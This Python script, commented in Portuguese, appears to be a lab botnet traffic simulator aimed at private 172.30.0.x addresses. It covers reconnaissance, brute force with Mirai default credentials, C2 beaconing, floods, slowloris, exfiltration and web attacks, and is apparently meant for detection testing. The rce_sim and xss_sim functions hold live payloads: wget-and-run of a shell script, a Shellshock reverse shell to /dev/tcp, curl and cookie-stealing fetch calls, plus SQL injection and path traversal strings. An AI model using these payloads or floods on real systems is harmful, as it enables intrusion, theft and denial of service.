"""
Extended Botnet Simulator — 20+ classes de ataque
Cobertura: MITRE ATT&CK TTPs para IoT/Botnet
"""
import socket
import time
import random
import sys
import struct
import threading
import json
import base64
import hashlib
import string

TARGETS = ["172.30.0.11", "172.30.0.12", "172.30.0.13"]
C2_HOST = "172.30.0.100"
C2_PORT = 8080
TIMEOUT = 0.5

def _connect(host, port, data=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((host, port))
        if data:
            s.send(data if isinstance(data, bytes) else data.encode())
        s.close()
        return True
    except:
        return False

def _udp_send(host, port, data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(data if isinstance(data, bytes) else data.encode(), (host, port))
        s.close()
    except:
        pass

# ─────────────────────────────────────────────
# 1. RECONHECIMENTO
# ─────────────────────────────────────────────

def port_scan():
    """Varredura TCP de portas comuns — Mirai-style"""
    print("[RECON] port_scan")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080, 8443,
             2323, 3306, 5432, 6379, 27017, 9200, 1883, 5683]
    for target in TARGETS:
        for port in ports:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                s.connect((target, port))
                s.close()
            except:
                pass

def os_fingerprint():
    """Fingerprint de OS via TTL e tamanho de janela TCP"""
    print("[RECON] os_fingerprint")
    for target in TARGETS:
        for port in [80, 443, 22]:
            try:
                s = socket.socket()
                s.settimeout(0.5)
                s.connect((target, port))
                # Envia pacotes com TTL variado para inferir OS
                probe = b"\x00" * random.randint(40, 1460)
                s.send(probe)
                s.close()
            except:
                pass
            time.sleep(0.05)

def service_enum():
    """Enumera serviços com banners conhecidos"""
    print("[RECON] service_enum")
    banner_probes = {
        22:  b"SSH-2.0-OpenSSH_PROBE\r\n",
        80:  b"HEAD / HTTP/1.0\r\n\r\n",
        21:  b"USER anonymous\r\n",
        23:  b"\xff\xfd\x18\xff\xfd\x20",  # Telnet negotiation
        25:  b"EHLO probe.local\r\n",
    }
    for target in TARGETS:
        for port, probe in banner_probes.items():
            try:
                s = socket.socket()
                s.settimeout(0.5)
                s.connect((target, port))
                s.send(probe)
                banner = s.recv(256)
                s.close()
            except:
                pass

def vuln_scan():
    """Simula scan de vulnerabilidades conhecidas (CVE-style probes)"""
    print("[RECON] vuln_scan")
    probes = [
        (80,  b"GET /cgi-bin/test-cgi HTTP/1.0\r\n\r\n"),        # ShellShock
        (80,  b"GET /manager/html HTTP/1.0\r\n\r\n"),             # Tomcat
        (80,  b"GET /wp-login.php HTTP/1.0\r\n\r\n"),             # WordPress
        (80,  b"GET /.env HTTP/1.0\r\n\r\n"),                     # Exposed env
        (8080,b"GET /actuator/env HTTP/1.0\r\n\r\n"),             # Spring Boot
        (9200,b"GET /_cat/indices HTTP/1.0\r\n\r\n"),             # Elasticsearch
        (6379,b"*1\r\n$4\r\nINFO\r\n"),                           # Redis
    ]
    for target in TARGETS:
        for port, probe in probes:
            _connect(target, port, probe)
            time.sleep(0.05)

# ─────────────────────────────────────────────
# 2. BRUTE FORCE
# ─────────────────────────────────────────────

def ssh_bruteforce():
    """Brute force SSH simulado (padrão Mirai)"""
    print("[BRUTEFORCE] ssh_bruteforce")
    creds = [
        ("root","root"), ("admin","admin"), ("root","toor"),
        ("pi","raspberry"), ("ubnt","ubnt"), ("user","user"),
        ("root","12345"), ("admin","1234"), ("root","vizxv"),
        ("root","xc3511"), ("root","jvbzd"), ("root","anko"),
    ]
    for target in TARGETS:
        for user, pwd in creds:
            msg = f"SSH_AUTH_REQUEST user={user} pass={pwd} version=2.0"
            _connect(target, 22, msg)
            time.sleep(0.08)

def telnet_bruteforce():
    """Brute force Telnet — vetor principal do Mirai original"""
    print("[BRUTEFORCE] telnet_bruteforce")
    creds = [
        ("root","root"), ("admin","admin"), ("root",""),
        ("root","xmhdipc"), ("root","default"), ("root","antslq"),
    ]
    for target in TARGETS:
        for user, pwd in creds:
            msg = f"TELNET_LOGIN {user} {pwd}"
            _connect(target, 23, msg)
            time.sleep(0.1)

def http_bruteforce():
    """Brute force HTTP Basic Auth / form login"""
    print("[BRUTEFORCE] http_bruteforce")
    creds = [
        ("admin","admin"), ("admin","password"), ("admin","123456"),
        ("root","toor"), ("user","pass"), ("test","test"),
    ]
    for target in TARGETS:
        for user, pwd in creds:
            b64 = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            req = (
                f"POST /login HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Authorization: Basic {b64}\r\n"
                f"Content-Length: 0\r\n\r\n"
            )
            _connect(target, 80, req)
            time.sleep(0.1)

def credential_stuffing():
    """Usa listas de credenciais vazadas — padrão de stuffing"""
    print("[BRUTEFORCE] credential_stuffing")
    # Simula pares de credential dumps conhecidos
    leaked = [
        ("john.doe@email.com", "Summer2019!"),
        ("user123", "Passw0rd"),
        ("alice", "qwerty123"),
        ("bob_smith", "letmein"),
        ("admin@corp.com", "Admin123"),
    ]
    for target in TARGETS:
        for user, pwd in leaked:
            payload = json.dumps({"username": user, "password": pwd})
            req = (
                f"POST /api/auth HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload)}\r\n\r\n"
                f"{payload}"
            )
            _connect(target, 80, req)
            time.sleep(0.15)

# ─────────────────────────────────────────────
# 3. COMANDO & CONTROLE (C2)
# ─────────────────────────────────────────────

def c2_beaconing():
    """Beaconing periódico com jitter mínimo — padrão Mirai/Gafgyt"""
    print("[C2] c2_beaconing")
    bot_id = hashlib.md5(b"bot001").hexdigest()[:8]
    for i in range(30):
        payload = json.dumps({
            "type": "heartbeat",
            "bot_id": bot_id,
            "seq": i,
            "arch": "mips",
            "os": "linux"
        })
        _connect(C2_HOST, C2_PORT, payload)
        time.sleep(1 + random.uniform(0, 0.1))  # jitter mínimo = suspeito

def c2_dga():
    """Domain Generation Algorithm — gera domínios aleatórios para C2"""
    print("[C2] c2_dga")
    seed = int(time.time()) // 86400  # muda por dia
    random.seed(seed)
    
    for _ in range(20):
        # Gera domínio pseudo-aleatório (alta entropia)
        length = random.randint(12, 20)
        domain = ''.join(random.choices(string.ascii_lowercase, k=length))
        domain += random.choice([".com", ".net", ".cc", ".pw", ".top"])
        
        # Simula DNS lookup + conexão (via socket direto para simulação)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # DNS query simulada para o domínio gerado
            dns_query = f"DGA_LOOKUP {domain}".encode()
            s.sendto(dns_query, (C2_HOST, 5353))
            s.close()
        except:
            pass
        time.sleep(0.5)

def c2_dns_tunnel():
    """Exfiltração/C2 via DNS tunneling — dados em subdomínios"""
    print("[C2] c2_dns_tunnel")
    secret_data = "BOT_STATUS:active;VICTIMS:3;VERSION:2.1"
    
    # Codifica dados em base32 (padrão de DNS tunnel como iodine/dnscat2)
    encoded = base64.b32encode(secret_data.encode()).decode().lower()
    
    # Fragmenta em chunks de 30 chars (limite DNS label)
    chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
    
    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{i}.c2tunnel.com"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Simula query DNS com dado tunelado no subdomínio
            query = f"DNS_QUERY {subdomain}".encode()
            s.sendto(query, (C2_HOST, 5353))
            s.close()
        except:
            pass
        time.sleep(0.2)

def c2_icmp_tunnel():
    """C2 via ICMP echo (ping) com dados no payload"""
    print("[C2] c2_icmp_tunnel")
    commands = [b"CMD:download", b"CMD:scan", b"CMD:flood", b"CMD:update"]
    
    for target in TARGETS:
        for cmd in commands:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Simula ICMP com payload de comando
                fake_icmp = b"\x08\x00" + cmd + b"\x00" * (32 - len(cmd))
                s.sendto(fake_icmp, (target, 7))  # echo port
                s.close()
            except:
                pass
            time.sleep(0.3)

# ─────────────────────────────────────────────
# 4. DDoS
# ─────────────────────────────────────────────

def syn_flood():
    """SYN flood simulado — TCP sem completar handshake"""
    print("[DDOS] syn_flood")
    target = random.choice(TARGETS)
    for _ in range(500):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((target, 80))
            # Não completa o handshake
            s.close()
        except:
            pass
        time.sleep(0.002)

def udp_flood():
    """UDP flood em portas aleatórias"""
    print("[DDOS] udp_flood")
    target = random.choice(TARGETS)
    payload = random.randbytes(512)
    for _ in range(400):
        port = random.randint(1024, 65535)
        _udp_send(target, port, payload)
        time.sleep(0.005)

def icmp_flood():
    """ICMP echo flood simulado"""
    print("[DDOS] icmp_flood")
    target = random.choice(TARGETS)
    for _ in range(300):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"\x08\x00" + b"\x00" * 56, (target, 7))
            s.close()
        except:
            pass
        time.sleep(0.005)

def http_flood():
    """HTTP GET flood — Layer 7"""
    print("[DDOS] http_flood")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Linux; Android 10)",
        "curl/7.68.0",
        "python-requests/2.25.1",
    ]
    target = random.choice(TARGETS)
    paths = ["/", "/index.html", "/api/data", "/search?q=test", "/images/logo.png"]
    
    for _ in range(200):
        ua = random.choice(user_agents)
        path = random.choice(paths)
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        _connect(target, 80, req)
        time.sleep(0.01)

def slowloris():
    """Slowloris — HTTP parcial para esgotar conexões"""
    print("[DDOS] slowloris")
    target = random.choice(TARGETS)
    sockets = []
    
    # Abre muitas conexões com headers incompletos
    for _ in range(50):
        try:
            s = socket.socket()
            s.settimeout(4)
            s.connect((target, 80))
            # Envia header incompleto (sem \r\n\r\n final)
            s.send(b"GET / HTTP/1.1\r\nHost: victim\r\nX-Slow: ")
            sockets.append(s)
        except:
            pass
    
    # Mantém conexões vivas enviando headers adicionais
    for _ in range(10):
        for s in sockets[:]:
            try:
                s.send(b"X-keep: alive\r\n")
            except:
                sockets.remove(s)
        time.sleep(1)
    
    for s in sockets:
        try: s.close()
        except: pass

# ─────────────────────────────────────────────
# 5. LATERAL MOVEMENT
# ─────────────────────────────────────────────

def smb_enum():
    """Enumeração SMB simulada — lateral movement interno"""
    print("[LATERAL] smb_enum")
    smb_ports = [445, 139, 137]
    smb_probes = [
        b"\x00\x00\x00\x85\xff\x53\x4d\x42",  # SMB header
        b"SMB_NEGOTIATE_PROTOCOL",
        b"NTLMSSP\x00\x01\x00\x00\x00",        # NTLM negotiate
    ]
    for target in TARGETS:
        for port in smb_ports:
            for probe in smb_probes:
                _connect(target, port, probe)
                time.sleep(0.1)

def arp_spoofing():
    """ARP spoofing simulado — man-in-the-middle"""
    print("[LATERAL] arp_spoofing")
    # Simula padrão de tráfego ARP anômalo (broadcast excessivo)
    for target in TARGETS:
        for _ in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Pacote ARP simulado
                arp_payload = b"ARP_REPLY" + target.encode() + b"\x00" * 20
                s.sendto(arp_payload, ("172.30.0.255", 0))  # broadcast
                s.close()
            except:
                pass
            time.sleep(0.05)

def port_forward():
    """Simula tunelamento/port forwarding para pivoting"""
    print("[LATERAL] port_forward")
    for target in TARGETS:
        tunnel_msg = json.dumps({
            "type": "tunnel_request",
            "src": "172.30.0.200",
            "dst": target,
            "lport": random.randint(10000, 60000),
            "rport": random.choice([22, 3389, 5900])
        })
        _connect(C2_HOST, C2_PORT, tunnel_msg)
        time.sleep(0.5)

# ─────────────────────────────────────────────
# 6. EXFILTRAÇÃO DE DADOS
# ─────────────────────────────────────────────

def data_exfil_http():
    """Exfiltração via HTTP POST para C2"""
    print("[EXFIL] data_exfil_http")
    # Simula dados exfiltrados (credenciais, configs)
    fake_data = {
        "type": "exfil",
        "host": "sensor01",
        "data": base64.b64encode(b"passwd:root:x:0:0:root:/root:/bin/bash").decode(),
        "size": 1024
    }
    
    for _ in range(10):
        # Fragmenta em chunks para evadir detecção por tamanho
        payload = json.dumps(fake_data)
        req = (
            f"POST /update HTTP/1.1\r\n"
            f"Host: {C2_HOST}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(payload)}\r\n\r\n"
            f"{payload}"
        )
        _connect(C2_HOST, C2_PORT, req)
        time.sleep(2)

def data_exfil_dns():
    """Exfiltração via DNS — dados em subdomínios (dnscat2-like)"""
    print("[EXFIL] data_exfil_dns")
    sensitive = "root:$6$hash$verylonghashvalue:18000:0:99999:7:::"
    encoded = base64.b32encode(sensitive.encode()).decode().lower()
    
    chunks = [encoded[i:i+20] for i in range(0, len(encoded), 20)]
    for seq, chunk in enumerate(chunks):
        query = f"{seq}.{chunk}.exfil.attacker.com"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(f"DNS_EXFIL {query}".encode(), (C2_HOST, 5353))
            s.close()
        except:
            pass
        time.sleep(0.3)

def data_exfil_icmp():
    """Exfiltração via ICMP payload"""
    print("[EXFIL] data_exfil_icmp")
    data_chunks = [b"EXFIL:" + bytes([i]) + b"\x00" * 30 for i in range(10)]
    for chunk in data_chunks:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(chunk, (C2_HOST, 7))
            s.close()
        except:
            pass
        time.sleep(0.5)

# ─────────────────────────────────────────────
# 7. COMPORTAMENTO DE MALWARE
# ─────────────────────────────────────────────

def ransomware_scan():
    """Simula scan de arquivos/shares antes de criptografar"""
    print("[MALWARE] ransomware_scan")
    # Acessa múltiplos serviços buscando shares e arquivos
    file_ports = [445, 139, 2049, 21, 22]  # SMB, NFS, FTP, SSH
    for target in TARGETS:
        for port in file_ports:
            probe = b"RANSOM_SCAN list_shares"
            _connect(target, port, probe)
            time.sleep(0.2)
    
    # Simula comunicação com servidor de chaves
    key_req = json.dumps({"type": "key_request", "victim_id": "abc123", "files": 9821})
    _connect(C2_HOST, C2_PORT, key_req)

def worm_spread():
    """Simula worm se espalhando para novos hosts"""
    print("[MALWARE] worm_spread")
    # Scan rápido da subnet buscando alvos vulneráveis
    subnet_base = "172.30.0."
    for i in range(1, 30):
        host = subnet_base + str(i)
        for port in [22, 23, 80, 8080]:
            try:
                s = socket.socket()
                s.settimeout(0.1)
                result = s.connect_ex((host, port))
                if result == 0:
                    # "Infecta" o host encontrado
                    s.send(b"WORM_PAYLOAD_EXEC chmod +x /tmp/.x && /tmp/.x &")
                s.close()
            except:
                pass

def cryptominer():
    """Simula comunicação de cryptominer com pool"""
    print("[MALWARE] cryptominer")
    # Stratum protocol (protocolo de mining pools)
    stratum_msgs = [
        '{"id":1,"method":"mining.subscribe","params":["MinerBot/1.0"]}',
        '{"id":2,"method":"mining.authorize","params":["wallet.worker","x"]}',
        '{"id":4,"method":"mining.submit","params":["wallet","job123","nonce","time","hash"]}',
    ]
    for msg in stratum_msgs:
        # Pools usam porta 3333, 4444, 14444
        for port in [3333, 4444, 8080]:
            _connect(C2_HOST, port, msg + "\n")
            time.sleep(1)

# ─────────────────────────────────────────────
# 8. WEB ATTACKS
# ─────────────────────────────────────────────

def lfi_sim():
    """Local File Inclusion simulado"""
    print("[WEB] lfi_sim")
    lfi_payloads = [
        "/../../../etc/passwd",
        "/../../../etc/shadow",
        "/../../../proc/self/environ",
        "/....//....//....//etc/passwd",
        "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/../../../var/log/apache2/access.log",
    ]
    for target in TARGETS:
        for payload in lfi_payloads:
            req = (
                f"GET /page?file={payload} HTTP/1.1\r\n"
                f"Host: {target}\r\n\r\n"
            )
            _connect(target, 80, req)
            time.sleep(0.1)

def sqli_sim():
    """SQL Injection simulado"""
    print("[WEB] sqli_sim")
    sqli_payloads = [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "' UNION SELECT null,username,password FROM users--",
        "admin'--",
        "1' AND SLEEP(5)--",
        "' OR 1=1 LIMIT 1--",
    ]
    for target in TARGETS:
        for payload in sqli_payloads:
            req = (
                f"GET /search?q={payload} HTTP/1.1\r\n"
                f"Host: {target}\r\n\r\n"
            )
            _connect(target, 80, req)
            time.sleep(0.1)

def rce_sim():
    """Remote Code Execution simulado"""
    print("[WEB] rce_sim")
    rce_payloads = [
        ";id",
        "|whoami",
        "`cat /etc/passwd`",
        "$(uname -a)",
        "; wget http://172.30.0.200/shell.sh -O /tmp/s && sh /tmp/s",
        "| curl http://172.30.0.200/$(whoami)",
    ]
    for target in TARGETS:
        for payload in rce_payloads:
            req = (
                f"GET /cmd?exec={payload} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: () {{ :; }}; /bin/bash -c 'bash -i >& /dev/tcp/172.30.0.200/4444 0>&1'\r\n\r\n"
            )
            _connect(target, 80, req)
            time.sleep(0.15)

def xss_sim():
    """XSS simulado — stored/reflected"""
    print("[WEB] xss_sim")
    xss_payloads = [
        "<script>document.location='http://172.30.0.200/steal?c='+document.cookie</script>",
        "<img src=x onerror=fetch('http://172.30.0.200/'+document.cookie)>",
        "javascript:eval(atob('YWxlcnQoMSk='))",
        "<svg onload=fetch('//172.30.0.200/xss')>",
    ]
    for target in TARGETS:
        for payload in xss_payloads:
            req = (
                f"POST /comment HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(payload)}\r\n\r\n"
                f"comment={payload}"
            )
            _connect(target, 80, req)
            time.sleep(0.1)

# ─────────────────────────────────────────────
# DISPATCHER
# ─────────────────────────────────────────────

ATTACK_MAP = {
    # Reconhecimento
    "port_scan":          port_scan,
    "os_fingerprint":     os_fingerprint,
    "service_enum":       service_enum,
    "vuln_scan":          vuln_scan,
    # Brute Force
    "ssh_bruteforce":     ssh_bruteforce,
    "telnet_bruteforce":  telnet_bruteforce,
    "http_bruteforce":    http_bruteforce,
    "credential_stuffing":credential_stuffing,
    # C2
    "c2_beaconing":       c2_beaconing,
    "c2_dga":             c2_dga,
    "c2_dns_tunnel":      c2_dns_tunnel,
    "c2_icmp_tunnel":     c2_icmp_tunnel,
    # DDoS
    "syn_flood":          syn_flood,
    "udp_flood":          udp_flood,
    "icmp_flood":         icmp_flood,
    "http_flood":         http_flood,
    "slowloris":          slowloris,
    # Lateral Movement
    "smb_enum":           smb_enum,
    "arp_spoofing":       arp_spoofing,
    "port_forward":       port_forward,
    # Exfiltração
    "data_exfil_http":    data_exfil_http,
    "data_exfil_dns":     data_exfil_dns,
    "data_exfil_icmp":    data_exfil_icmp,
    # Malware
    "ransomware_scan":    ransomware_scan,
    "worm_spread":        worm_spread,
    "cryptominer":        cryptominer,
    # Web Attacks
    "lfi_sim":            lfi_sim,
    "sqli_sim":           sqli_sim,
    "rce_sim":            rce_sim,
    "xss_sim":            xss_sim,
}

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "list"

    if mode == "list":
        print("\nAtaques disponíveis:")
        for category, attacks in [
            ("Reconhecimento",    ["port_scan","os_fingerprint","service_enum","vuln_scan"]),
            ("Brute Force",       ["ssh_bruteforce","telnet_bruteforce","http_bruteforce","credential_stuffing"]),
            ("C2",                ["c2_beaconing","c2_dga","c2_dns_tunnel","c2_icmp_tunnel"]),
            ("DDoS",              ["syn_flood","udp_flood","icmp_flood","http_flood","slowloris"]),
            ("Lateral Movement",  ["smb_enum","arp_spoofing","port_forward"]),
            ("Exfiltração",       ["data_exfil_http","data_exfil_dns","data_exfil_icmp"]),
            ("Malware",           ["ransomware_scan","worm_spread","cryptominer"]),
            ("Web Attacks",       ["lfi_sim","sqli_sim","rce_sim","xss_sim"]),
        ]:
            print(f"\n  [{category}]")
            for a in attacks:
                print(f"    {a}")

    elif mode == "all":
        for name, fn in ATTACK_MAP.items():
            print(f"\n{'='*50}")
            fn()

    elif mode in ATTACK_MAP:
        ATTACK_MAP[mode]()

    else:
        print(f"[ERRO] Ataque desconhecido: {mode}")
        print("Use 'list' para ver ataques disponíveis")
